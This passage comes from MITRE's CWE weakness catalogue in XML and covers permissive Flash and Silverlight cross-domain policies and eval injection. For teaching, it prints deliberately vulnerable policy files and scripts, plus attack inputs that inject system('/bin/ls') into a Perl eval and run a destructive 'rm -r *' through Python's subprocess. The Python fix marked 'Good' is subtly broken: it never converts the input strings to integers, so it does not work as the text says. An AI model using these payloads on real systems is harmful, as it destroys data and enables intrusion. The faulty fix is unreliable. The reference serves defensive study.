            <xhtml:p>A cross-domain policy file ("crossdomain.xml" in Flash and "clientaccesspolicy.xml" in Silverlight) defines a list of domains from which a server is allowed to make cross-domain requests. When making a cross-domain request, the Flash or Silverlight client will first look for the policy file on the target server. If it is found, and the domain hosting the application is explicitly allowed to make requests, the request is made.</xhtml:p>
            <xhtml:p>Therefore, if a cross-domain policy file includes domains that should not be trusted, such as when using wildcards, then the application could be attacked by these untrusted domains.</xhtml:p>
            <xhtml:p>An overly permissive policy file allows many of the same attacks seen in Cross-Site Scripting (CWE-79). Once the user has executed a malicious Flash or Silverlight application, they are vulnerable to a variety of attacks. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site.</xhtml:p>
            <xhtml:p>In many cases, the attack can be launched without the victim even being aware of it.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="923" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="183" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="668" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Varies by Context</Impact>
               <Note>An attacker may be able to bypass the web browser's same-origin policy. An attacker can exploit the weakness to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running ActiveX controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Avoid using wildcards in the cross-domain policy file. Any domain matching the wildcard expression will be implicitly trusted, and can perform two-way interaction with the target server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>These cross-domain policy files mean to allow Flash and Silverlight applications hosted on other domains to access its data:</Intro_Text>
               <Body_Text>Flash crossdomain.xml :</Body_Text>
               <Example_Code Nature="Bad" Language="XML">
                  <xhtml:div>&lt;cross-domain-policy xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"<xhtml:br/>xsi:noNamespaceSchemaLocation="http://www.adobe.com/xml/schemas/PolicyFile.xsd"&gt;<xhtml:br/>&lt;allow-access-from domain="*.example.com"/&gt;<xhtml:br/>&lt;allow-access-from domain="*"/&gt;<xhtml:br/>&lt;/cross-domain-policy&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Silverlight clientaccesspolicy.xml :</Body_Text>
               <Example_Code Nature="Bad" Language="XML">
                  <xhtml:div>&lt;?xml version="1.0" encoding="utf-8"?&gt;<xhtml:br/>&lt;access-policy&gt;<xhtml:br/>&lt;cross-domain-access&gt;<xhtml:br/>&lt;policy&gt;<xhtml:br/>&lt;allow-from http-request-headers="SOAPAction"&gt;<xhtml:br/>&lt;domain uri="*"/&gt;<xhtml:br/>&lt;/allow-from&gt;<xhtml:br/>&lt;grant-to&gt;<xhtml:br/>&lt;resource path="/" include-subpaths="true"/&gt;<xhtml:br/>&lt;/grant-to&gt;<xhtml:br/>&lt;/policy&gt;<xhtml:br/>&lt;/cross-domain-access&gt;<xhtml:br/>&lt;/access-policy&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>These entries are far too permissive, allowing any Flash or Silverlight application to send requests. A malicious application hosted on any other web site will be able to send requests on behalf of any user tricked into executing it.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2012-2292</Reference>
               <Description>Product has a Silverlight cross-domain policy that does not restrict access to another application, which allows remote attackers to bypass the Same Origin Policy.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-2292</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-2049</Reference>
               <Description>The default Flash Cross Domain policies in a product allows remote attackers to access user files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-2049</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6243</Reference>
               <Description>Chain: Adobe Flash Player does not sufficiently restrict the interpretation and usage of cross-domain policy files, which makes it easier for remote attackers to conduct cross-domain and cross-site scripting (XSS) attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-6243</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4822</Reference>
               <Description>Chain: Adobe Flash Player and earlier does not properly interpret policy files, which allows remote attackers to bypass a non-root domain policy.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4822</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-3636</Reference>
               <Description>Chain: Adobe Flash Player does not properly handle unspecified encodings during the parsing of a cross-domain policy file, which allows remote web servers to bypass intended access restrictions via unknown vectors.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-3636</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-943"/>
            <Reference External_Reference_ID="REF-944"/>
            <Reference External_Reference_ID="REF-945"/>
            <Reference External_Reference_ID="REF-946"/>
            <Reference External_Reference_ID="REF-947"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2014-06-05</Submission_Date>
               <Submission_Comment>Created by MITRE with input from members of the CWE-Research mailing list.</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Description, Name</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Relationships</Modification_Comment>
				</Modification>
			<Previous_Entry_Name Date="2020-02-26">Overly Permissive Cross-domain Whitelist</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="95" Name="Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call (e.g. "eval").</Description>
         <Extended_Description>This may allow an attacker to execute arbitrary code, or at least modify what code can be executed.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="94" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
            <Language Name="JavaScript" Prevalence="Undetermined"/>
            <Language Name="Python" Prevalence="Undetermined"/>
            <Language Name="Perl" Prevalence="Undetermined"/>
            <Language Name="PHP" Prevalence="Undetermined"/>
            <Language Name="Ruby" Prevalence="Undetermined"/>
            <Language Class="Interpreted" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This weakness is prevalent in handler/dispatch procedures that might want to invoke a large number of functions, or set a large number of variables.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Read Application Data</Impact>
               <Note>The injected code could access restricted data / files.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>In some cases, injectable code controls authentication; this may lead to a remote vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Injected code can access resources that the attacker is directly prevented from accessing.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Often the actions performed by injected control code are unlogged.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>If possible, refactor your code so that it does not need to use eval() at all.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.</xhtml:p>
                  <xhtml:p>Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-31">
               <Intro_Text>edit-config.pl: This CGI script is used to modify settings in a configuration file.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>use CGI qw(:standard);<xhtml:br/>
                     <xhtml:br/>sub config_file_add_key {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:i># code to add a field/key to a file goes here</xhtml:i><xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub config_file_set_key {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:i># code to set key to a particular file goes here</xhtml:i><xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub config_file_delete_key {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:i># code to delete key from a particular file goes here</xhtml:i><xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub handleConfigAction {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>my ($fname, $action) = @_;<xhtml:br/>my $key = param('key');<xhtml:br/>my $val = param('val');<xhtml:br/>
                        
                           <xhtml:i># this is super-efficient code, especially if you have to invoke</xhtml:i><xhtml:br/>
                           <xhtml:i># any one of dozens of different functions!</xhtml:i><xhtml:br/>
                           <xhtml:br/>my $code = "config_file_$action_key(\$fname, \$key, \$val);";<xhtml:br/>eval($code);</xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>$configfile = "/home/cwe/config.txt";<xhtml:br/>print header;<xhtml:br/>if (defined(param('action'))) {<xhtml:div style="margin-left:1em;">handleConfigAction($configfile, param('action'));</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">print "No action specified!\n";</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>add_key(",","); system("/bin/ls");</xhtml:div>
               </Example_Code>
               <Body_Text>This would produce the following string in handleConfigAction():</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>config_file_add_key(",","); system("/bin/ls");</xhtml:div>
               </Example_Code>
               <Body_Text>Any arbitrary Perl code could be added after the attacker has "closed off" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the "_key(\$fname, \$key, \$val)" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-156">
               <Intro_Text>This simple script asks a user to supply a list of numbers as input and adds them together.</Intro_Text>
               <Example_Code Nature="Bad" Language="Python">
                  <xhtml:div>
                  def main():<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                     sum = 0<xhtml:br/>
                     numbers = eval(input("Enter a space-separated list of numbers: "))<xhtml:br/>
                     for num in numbers:<xhtml:br/>
                        <xhtml:div style="margin-left:1em;">
                        sum = sum + num<xhtml:br/>
                        </xhtml:div>
                     print(f"Sum of {numbers} = {sum}")
                     </xhtml:div>
                  main()
                  </xhtml:div>
               </Example_Code>
               <Body_Text>The eval() function can take the user-supplied list and convert it into a Python list object, therefore allowing the programmer to use list comprehension methods to work with the data. However, if code is supplied to the eval() function, it will execute that code. For example, a malicious user could supply the following string:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>__import__('subprocess').getoutput('rm -r *')</xhtml:div>
               </Example_Code>
               <Body_Text>This would delete all the files in the current directory. For this reason, it is not recommended to use eval() with untrusted input.</Body_Text>
	       <Body_Text>A way to accomplish this without the use of eval() is to apply an integer conversion on the input within a try/except block. If the user-supplied input is not numeric, this will raise a ValueError. By avoiding eval(), there is no opportunity for the input string to be executed as code.</Body_Text>
               <Example_Code Nature="Good" Language="Python">
                  <xhtml:div>
                  def main():<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                     sum = 0<xhtml:br/>
                     numbers = input("Enter a space-separated list of numbers: ").split(" ")<xhtml:br/>
                     try:<xhtml:br/>
                        <xhtml:div style="margin-left:1em;">
                        for num in numbers:<xhtml:br/>
                           <xhtml:div style="margin-left:1em;">
                           sum = sum + num<xhtml:br/>
                           </xhtml:div>
                        print(f"Sum of {numbers} = {sum}")
                        </xhtml:div>
                     except ValueError:<xhtml:br/>
                        <xhtml:div style="margin-left:1em;">
                        print("Error: invalid input")<xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  main()
                  </xhtml:div>
               </Example_Code>
               <Body_Text>An alternative option is to use the ast.literal_eval() function from Python's ast module. This function considers only Python literals as valid data types and will not execute any code contained within the user input.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-2054</Reference>
               <Description>Python compiler uses eval() to execute malicious strings as Python code.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-2054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-22204</Reference>
               <Description>Chain: regex in EXIF processor code does not correctly determine where a string ends (CWE-625), enabling eval injection (CWE-95), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22204</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-22205</Reference>
               <Description>Chain: backslash followed by a newline can bypass a validation step (CWE-20), leading to eval injection (CWE-95), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22205</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5071</Reference>
               <Description>Eval injection in PHP program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5071</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1750</Reference>
               <Description>Eval injection in Perl program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1750</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5305</Reference>
               <Description>Eval injection in Perl program using an ID that should only contain hyphens and numbers.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5305</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1752</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1752</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1753</Reference>
               <Description>Eval injection in Perl program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1753</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1527</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1527</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2837</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2837</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1921</Reference>
               <Description>MFV. code injection into PHP eval statement using nested constructs that should not be nested.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1921</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2498</Reference>
               <Description>MFV. code injection into PHP eval statement using nested constructs that should not be nested.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2498</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3302</Reference>
               <Description>Code injection into Python eval statement from a field in a formatted file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3302</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1253</Reference>
               <Description>Eval injection in Python program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-1253</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1471</Reference>
               <Description>chain: Resultant eval injection. An invalid value prevents initialization of variables, which can be modified by attacker and later injected into PHP eval statement.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1471</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-2713</Reference>
               <Description>Chain: Execution after redirect triggers eval injection.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-2713</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Direct Dynamic Code Evaluation ('Eval Injection')</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Malicious File Execution</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <Entry_ID>IDS35-PL</Entry_ID>
               <Entry_Name>Do not invoke the eval form with a string argument</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="35"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 18, &#34;Inline Evaluation&#34;, Page 1095"/>
         </References>
         <Notes>
            <Note Type="Other">Factors: special character errors can play a role in increasing the variety of code that can be injected, although some vulnerabilities do not require special characters at all, e.g. when a single function without arguments can be referenced and a terminator character is not necessary.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Modes_of_Introduction, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Observed_Examples, Other_Notes, Research_Gaps</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Demonstrative_Examples, Description, Name, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Causal_Nature, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Direct Dynamic Code Evaluation ('Eval Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Insufficient Control of Directives in Dynamically Evaluated Code (aka 'Eval Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Improper Sanitization of Directives in Dynamically Evaluated Code ('Eval Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="96" Name="Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
